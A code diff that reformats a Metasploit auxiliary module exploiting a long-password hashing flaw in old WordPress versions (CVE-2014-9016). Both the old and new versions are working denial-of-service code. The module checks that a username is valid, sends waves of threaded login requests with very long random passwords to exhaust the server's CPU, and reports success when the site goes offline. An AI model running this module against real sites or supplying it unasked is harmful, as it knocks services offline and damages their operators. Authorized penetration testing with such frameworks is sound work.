@@ -8,29 +8,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress Long Password DoS',
-      'Description'     => %q{WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x
-                              before 4.0.1 allows remote attackers to cause a denial of service
-                              (CPU consumption) via a long password that is improperly handled
-                              during hashing.},
-      'License'         => MSF_LICENSE,
-      'Author'          =>
-        [
-          'Javier Nieto Arevalo',  # Vulnerability disclosure
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Long Password DoS',
+        'Description' => %q{
+          WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x
+          before 4.0.1 allows remote attackers to cause a denial of service
+          (CPU consumption) via a long password that is improperly handled
+          during hashing.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Javier Nieto Arevalo', # Vulnerability disclosure
           'Andres Rojas Guerrero', # Vulnerability disclosure
           'rastating'              # Metasploit module
         ],
-      'References'      =>
-        [
+        'References' => [
           ['CVE', '2014-9016'],
           ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2014-9034'],
           ['OSVDB', '114857'],
           ['WPVDB', '7681']
         ],
-      'DisclosureDate'  => '2014-11-20'
-    ))
+        'DisclosureDate' => '2014-11-20',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -40,7 +47,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
         OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
         OptBool.new('VALIDATE_USER', [true, 'Validate the specified username', true])
-      ])
+      ]
+    )
   end
 
   def rlimit
@@ -68,55 +76,53 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def user_exists(user)
-    exists = wordpress_user_exists?(user)
-    if exists
+    if wordpress_user_exists?(user)
       print_good("Username \"#{username}\" is valid")
       store_valid_credential(user: user, private: nil, proof: "WEBAPP=\"Wordpress\", VHOST=#{vhost}")
       return true
-    else
-      print_error("\"#{user}\" is not a valid username")
-      return false
     end
+
+    print_error("\"#{user}\" is not a valid username")
+    return false
   end
 
   def run
-    if wordpress_and_online?
-      if validate_user
-        print_status("Checking if user \"#{username}\" exists...")
-        unless user_exists(username)
-          print_error('Aborting operation - a valid username must be specified')
-          return
-        end
-      end
-
-      starting_thread = 1
-      while starting_thread < rlimit do
-        ubound = [rlimit - (starting_thread - 1), thread_count].min
-        print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
-
-        threads = []
-        1.upto(ubound) do |i|
-          threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
-            begin
-              wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)
-            rescue => e
-              print_error("Timed out during request #{(starting_thread - 1) + i}")
-            end
-          end
-        end
-
-        threads.each(&:join)
-        print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
-        starting_thread += ubound
-      end
-
-      if wordpress_and_online?
-        print_error("FAILED: #{target_uri} appears to still be online")
-      else
-        print_good("SUCCESS: #{target_uri} appears to be down")
-      end
-    else
+    unless wordpress_and_online?
       print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress")
+      return
+    end
+
+    if validate_user
+      print_status("Checking if user \"#{username}\" exists...")
+      unless user_exists(username)
+        print_error('Aborting operation - a valid username must be specified')
+        return
+      end
+    end
+
+    starting_thread = 1
+    while starting_thread < rlimit
+      ubound = [rlimit - (starting_thread - 1), thread_count].min
+      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
+
+      threads = []
+      1.upto(ubound) do |i|
+        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_t|
+          wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)
+        rescue StandardError
+          print_error("Timed out during request #{(starting_thread - 1) + i}")
+        end
+      end
+
+      threads.each(&:join)
+      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
+      starting_thread += ubound
+    end
+
+    if wordpress_and_online?
+      print_error("FAILED: #{target_uri} appears to still be online")
+    else
+      print_good("SUCCESS: #{target_uri} appears to be down")
     end
   end
 end
